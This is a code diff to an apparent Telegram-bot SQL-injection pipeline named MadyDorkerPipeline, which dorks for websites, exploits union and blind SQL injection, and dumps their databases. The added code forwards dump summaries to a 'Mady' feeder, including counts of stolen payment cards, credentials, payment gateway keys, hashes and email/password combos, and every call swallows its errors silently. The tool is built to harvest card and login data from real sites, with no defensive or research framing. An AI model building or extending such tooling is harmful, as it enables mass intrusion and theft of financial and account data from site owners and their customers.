@@ -1299,6 +1299,21 @@ class MadyDorkerPipeline:
                                                 "combos": len(parsed.combos_user_pass) + len(parsed.combos_email_pass),
                                                 "files": list(parsed.files.keys()),
                                             })
+                                            # Feed dump report to Mady
+                                            if self.mady_feeder:
+                                                try:
+                                                    self.mady_feeder.feed_dump(
+                                                        url, sqli.dbms or 'Unknown', sqli.current_db or 'N/A',
+                                                        tables=len(parsed.tables_dumped), rows=parsed.total_rows,
+                                                        cards=len(parsed.cards), credentials=len(parsed.credentials),
+                                                        gateway_keys=len(parsed.gateway_keys),
+                                                        dump_type=sqli.injection_type, source="auto_dump",
+                                                        extra={"hashes": len(parsed.hashes), "emails": len(parsed.emails),
+                                                               "combos": len(parsed.combos_user_pass) + len(parsed.combos_email_pass),
+                                                               "files": list(parsed.files.keys())},
+                                                    )
+                                                except Exception:
+                                                    pass
                                             # Sync high-value finds to in-memory state
                                             if parsed.cards:
                                                 self.found_cards.extend(parsed.cards)
@@ -1361,6 +1376,17 @@ class MadyDorkerPipeline:
                                                     {t: len(rows) for t, rows in dump.data.items()},
                                                     saved,
                                                 )
+                                                # Feed dump to Mady
+                                                if self.mady_feeder:
+                                                    try:
+                                                        self.mady_feeder.feed_dump(
+                                                            url, dump.dbms, dump.database or 'N/A',
+                                                            tables=len(dump.tables), rows=dump.total_rows,
+                                                            cards=len(dump.card_data),
+                                                            dump_type="union", source="legacy_union",
+                                                        )
+                                                    except Exception:
+                                                        pass
                                 
                                 # Legacy fallback: if auto_dumper disabled, use old path
                                 elif self.config.dumper_enabled and not self.auto_dumper:
@@ -1376,6 +1402,17 @@ class MadyDorkerPipeline:
                                                 url, dump.dbms, dump.database, dump.tables,
                                                 {t: len(rows) for t, rows in dump.data.items()}, saved,
                                             )
+                                            # Feed dump to Mady
+                                            if self.mady_feeder:
+                                                try:
+                                                    self.mady_feeder.feed_dump(
+                                                        url, dump.dbms, dump.database or 'N/A',
+                                                        tables=len(dump.tables), rows=dump.total_rows,
+                                                        cards=len(dump.card_data),
+                                                        dump_type="union", source="legacy_union",
+                                                    )
+                                                except Exception:
+                                                    pass
                                     elif (self.config.dumper_blind_enabled and
                                           sqli.injection_type in ("boolean", "time")):
                                         dump = await self.dumper.blind_targeted_dump(sqli, session)
@@ -1386,6 +1423,16 @@ class MadyDorkerPipeline:
                                                 "tables": len(dump.tables), "rows": dump.total_rows,
                                                 "files": saved,
                                             })
+                                            # Feed blind dump to Mady
+                                            if self.mady_feeder:
+                                                try:
+                                                    self.mady_feeder.feed_dump(
+                                                        url, dump.dbms, dump.database or 'N/A',
+                                                        tables=len(dump.tables), rows=dump.total_rows,
+                                                        dump_type=sqli.injection_type, source="legacy_blind",
+                                                    )
+                                                except Exception:
+                                                    pass
                       except Exception as e:
                         logger.warning(f"SQLi scan failed for {url}: {e}")
                     
@@ -3887,6 +3934,19 @@ async def _do_scan(update: Update, url: str):
                                                         except Exception:
                                                             pass
                                         
+                                        # Feed /scan dump to Mady
+                                        if p.mady_feeder:
+                                            try:
+                                                p.mady_feeder.feed_dump(
+                                                    r.url, dump.dbms, dump.database or 'N/A',
+                                                    tables=len(dump.tables), rows=dump.total_rows,
+                                                    cards=len(dump.card_data), credentials=len(dump.credentials),
+                                                    gateway_keys=len(dump.gateway_keys),
+                                                    dump_type="union", source="scan_sqli_dump",
+                                                )
+                                            except Exception:
+                                                pass
+                                        
                                         dump_text = (
                                             f"📦 <b>Data Dump Successful!</b>\n"
                                             f"DB: {dump.database or 'N/A'} ({dump.dbms})\n"
@@ -3986,6 +4046,19 @@ async def _do_scan(update: Update, url: str):
                                                             p.mady_feeder.feed_gateway(r.url, f"db_{col}", val, source="scan_blind_dump")
                                                         except Exception:
                                                             pass
+                                        
+                                        # Feed /scan blind dump to Mady
+                                        if p.mady_feeder:
+                                            try:
+                                                p.mady_feeder.feed_dump(
+                                                    r.url, dump.dbms, dump.database or 'N/A',
+                                                    tables=len(dump.tables), rows=dump.total_rows,
+                                                    cards=len(dump.card_data), credentials=len(dump.credentials),
+                                                    gateway_keys=len(dump.gateway_keys),
+                                                    dump_type=r.injection_type, source="scan_blind_dump",
+                                                )
+                                            except Exception:
+                                                pass
                                         
                                         dump_text = (
                                             f"🐢📦 <b>Blind Dump Successful!</b>\n"
